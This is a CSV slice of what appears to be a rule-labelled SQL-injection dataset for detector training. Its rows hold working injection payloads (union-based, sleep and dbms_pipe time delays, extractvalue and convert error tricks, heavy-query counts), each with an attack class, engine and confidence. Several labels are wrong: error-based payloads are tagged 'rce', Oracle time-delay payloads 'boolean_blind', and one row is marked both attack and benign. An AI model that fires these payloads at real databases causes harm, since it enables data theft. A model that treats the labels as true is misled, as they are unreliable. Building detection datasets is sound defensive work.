row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
4904,"1' ) ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( 'odkr' = 'odkr",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
4905,"1"" where 3933 = 3933 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
4906,"1"" and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ""xwnw"" = ""xwnw",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
4907,1%' ) rlike ( select ( case when ( 1210 = 8664 ) then 1 else 0x28 end ) ) and ( '%' = ',1,,boolean_blind,generic,0.95,") and (, rlike  detected — boolean_blind injection (priority 8) on generic",rule-based
4908,1' ) where 1424 = 1424 and sleep ( 5 ) --,1,,time_blind,mysql,0.95,"sleep (, and sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
4909,"-6906' where 1839 = 1839 union all select 1839,1839,1839,1839,1839--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
4910,1' ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
4911,"1%' union all select null,null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
4912,"1"" where 4366 = 4366 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,,boolean_blind,generic,0.95,4366 = 4366 and detected — boolean_blind injection (priority 8) on generic,rule-based
4913,"1' ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
4914,"1'+ ( select 'ovti' where 4243 = 4243 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) ) +'",1,,boolean_blind,generic,0.95,4243 = 4243 and detected — boolean_blind injection (priority 8) on generic,rule-based
4915,1'|| ( select 'awic' where 5227 = 5227,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4916,1' ) ) ) or sleep ( 5 ) #,1,,time_blind,mysql,0.95,"sleep (, or sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
4917,"-8327 where 7555 = 7555 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",1,,error_based,generic,0.95,convert ( int detected — error_based injection (priority 4) on generic,rule-based
4918,-5229' ) ) as tkqp where 9253 = 9253 or 9323 = 9323#,1,,boolean_blind,generic,0.95,9253 = 9253 or detected — boolean_blind injection (priority 8) on generic,rule-based
4919,1' where 8482 = 8482 or sleep ( 5 ) #,1,,time_blind,mysql,0.95,"sleep (, or sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
